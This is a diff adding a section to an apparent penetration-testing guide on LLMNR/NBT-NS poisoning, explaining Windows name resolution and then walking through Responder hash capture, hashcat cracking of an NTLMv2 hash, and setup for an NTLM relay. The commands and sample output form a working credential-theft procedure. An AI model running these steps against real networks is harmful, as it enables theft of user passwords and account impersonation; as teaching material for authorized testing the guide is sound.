@@ -1198,6 +1198,134 @@ flowchart TD
 * Allows attackers to harvest authentication credentials without user interaction.
 * Can be combined with **hash cracking** or **SMB relay attacks**.
 
+When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:
+
+```mermaid
+flowchart TD
+    A["User/System needs hostname's IP address"] --> B["Check Local Hosts File\n(C:\\Windows\\System32\\Drivers\\etc\\hosts)"]
+    B -->|Record Found| Z["Use IP Address"]
+    B -->|No Record| C["Check Local DNS Cache"]
+    C -->|Record Found| Z
+    C -->|No Record| D["Query Configured DNS Server"]
+    D -->|Record Found| Z
+    D -->|Negative Response| F["Host Not Found"]
+    D -->|Server Unreachable| E["Send Multicast Query\n(LLMNR/NBT-NS)"]
+    E -->|Response Received| Z
+    E -->|No Response| F
+```
+
+**Step 1: Create a fake SMB server using the Responder default configuration:**
+
+```bash
+sudo responder -I ens3
+```
+
+**Expected Output:**
+
+```bash
+#   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+#   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+#   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+#                    |__|
+
+#            NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+#   To support this project:
+#   Patreon -> https://www.patreon.com/PythonResponder
+#   Paypal  -> https://paypal.me/PythonResponder
+
+#   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+#   To kill this script hit CTRL-C
+
+# ...
+
+
+# [+] Listening for events...
+
+# ...
+```
+
+**Example output when credentials are captured:**
+
+```bash
+# [*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Domain Master Browser)
+# [*] [NBT-NS] Poisoned answer sent to <TARGET_IP> for name WORKGROUP (service: Browser Election)
+# [*] [MDNS] Poisoned answer sent to <TARGET_IP>   for name mysharefoder.local
+# [*] [LLMNR]  Poisoned answer sent to <TARGET_IP> for name mysharefoder
+# [*] [MDNS] Poisoned answer sent to <TARGET_IP>   for name mysharefoder.local
+# [SMB] NTLMv2-SSP Client   : <TARGET_IP>
+# [SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+# [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:<NTLM_SERVER_CHALLENGE>:<NTLMV2_RESPONSE>:<NTLMV2_BLOB>
+```
+
+These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
+
+All saved Hashes are located in Responder's logs directory (**`/usr/share/responder/logs/`**). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.
+
+> **NOTE:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
+
+**Step 2: Use hashcat to crak the password:**
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Expected Output:**
+
+```bash
+# hashcat (v6.1.1) starting...
+
+# ...
+
+# Dictionary cache hit:
+# * Filename..: /usr/share/wordlists/rockyou.txt
+# * Passwords.: 14344386
+# * Bytes.....: 139921355
+# * Keyspace..: 14344386
+
+# ADMINISTRATOR::WIN7BOX:<NTLM_SERVER_CHALLENGE>:<NTLMV2_RESPONSE>:<NTLMV2_BLOB>:P@ssword
+
+# Session..........: hashcat
+# Status...........: Cracked
+# Hash.Name........: NetNTLMv2
+# Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
+# Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
+# Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
+# Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+# Guess.Queue......: 1/1 (100.00%)
+# Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+# Recovered........: 1/1 (100.00%) Digests
+# Progress.........: 75776/14344386 (0.53%)
+# Rejected.........: 0/75776 (0.00%)
+# Restore.Point....: 73728/14344386 (0.51%)
+# Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+# Candidates.#1....: compu -> kodiak1
+
+# Started: Mon Apr 11 16:49:34 2022
+# Stopped: Mon Apr 11 16:49:37 2022
+```
+
+The captured NTLMv2 hash was successfully cracked, revealing the password: **`P@ssword`**.
+If the hash cannot be cracked, it may still be leveraged through a relay attack. This can be achieved using tools such as `impacket-ntlmrelayx` or Responder’s `MultiRelay.py`.
+
+**Step 3: Perform an NTLM relay attack with impacket-ntlmrelayx:**
+
+```bash
+sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
+```
+
+**Step 4: Verify changes**
+
+```bash
+cat /etc/responder/Responder.conf | grep 'SMB ='
+```
+
+**Expected Output:**
+
+```bash
+# SMB = Off
+```
+
 </details>
 
 </details>
